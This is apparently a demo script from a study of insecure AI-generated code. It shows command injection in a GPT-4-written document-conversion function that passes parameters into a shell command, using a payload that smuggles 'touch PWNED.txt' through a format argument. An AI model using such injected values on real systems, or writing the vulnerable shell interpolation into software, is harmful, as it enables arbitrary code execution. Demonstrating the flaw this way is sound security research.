#!/usr/bin/env bash
# Demonstrates command injection in output/gpt-4/cmd_004.py.
#
# The AI generated a `convertDocument(input, output, format)` function
# that f-string-interpolates all three parameters into a shell command
# run with shell=True. Pass shell metacharacters in any parameter and
# the shell executes them.
#
# Usage:
#   ./run-demo.sh
#
# Run from this directory.

set -e

cd "$(dirname "$0")"

PYTHON="${PYTHON:-../../venv/bin/python}"
if [ ! -x "$PYTHON" ]; then
    echo "Error: cannot find project venv python at $PYTHON" >&2
    exit 1
fi

MARKER=PWNED.txt

echo "=== Pre-check: marker file should not exist ==="
rm -f "$MARKER"
ls "$MARKER" 2>&1 | grep -v "$MARKER" || echo "  ok, no marker"
echo

echo "=== The exploit payload ==="
# The attacker controls one of the convertDocument() parameters. We use
# OUTPUT_FORMAT here. Any of input_file/output_file/output_format works.
PAYLOAD='pdf; touch PWNED.txt; date >> PWNED.txt; echo'
echo "  OUTPUT_FORMAT = $PAYLOAD"
echo
echo "  (the resulting shell command after f-string interpolation:)"
echo "  libreoffice --headless --convert-to $PAYLOAD --outdir output.pdf input.docx"
echo "  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^"
echo "  shell sees three statements separated by ';'"
echo

echo "=== Running victim (which calls the AI-generated convertDocument) ==="
# We expect libreoffice to fail (probably not installed, and even if it
# is, the format 'pdf; touch ...' is invalid). That's fine — by the time
# libreoffice's branch fails, the injected `touch PWNED.txt` has already
# executed. Suppress libreoffice's stderr to keep the demo clean.
OUTPUT_FORMAT="$PAYLOAD" "$PYTHON" victim.py 2>/dev/null
echo

echo "=== Post-check: did arbitrary code execute? ==="
if [ -f "$MARKER" ]; then
    echo "  RCE CONFIRMED. Marker file contents:"
    sed 's/^/    /' "$MARKER"
else
    echo "  No marker file — RCE did NOT execute"
    exit 1
fi
